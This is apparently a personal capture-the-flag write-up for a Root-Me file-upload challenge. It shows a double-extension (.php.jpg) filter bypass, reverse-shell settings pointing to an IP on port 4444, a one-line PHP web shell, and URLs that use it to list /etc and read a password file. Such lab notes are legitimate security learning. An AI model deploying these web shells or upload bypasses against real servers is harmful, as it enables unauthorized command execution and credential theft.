# File upload(php-webshell) - Double extensions(php.jpg or jpg.php)

└─$ find /opt -name '\*php' 2>/dev/null

/opt/webshells/php/php-reverse-shell.php

└─$ curl ifconfig.me 192.40.57.235

set\_time\_limit (0); $VERSION = "1.0"; $ip = '192.40.57.235'; // CHANGE THIS $port = 4444; // CHANGE THIS $chunk\_size = 1400; $write\_a = null; $error\_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0;

└─$ cp php-reverse-shell.php php-reverse-shell.php.jpg

\->

then upload

and then

take the link http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/70a011aab16ec40b0a674598c47f0a99/php-reverse-shell.php.jpg

\->

then I port forwarded with local ip and port 4444

\->

not working

\->

then in order to bypass filter: it must end with jpeg extension but in order to be executed: it must have php

web\_shell.php.jpg

```
<?php
    system($_GET[cmd]);
?>
```

\->

http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/d6335bcb6c9bb4e3cf4f185ff565d68d/web\_shell2.php.jpg?cmd=ls%20/etc

\->

http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/d6335bcb6c9bb4e3cf4f185ff565d68d/web\_shell2.php.jpg?cmd=cat%20../../../.passwd
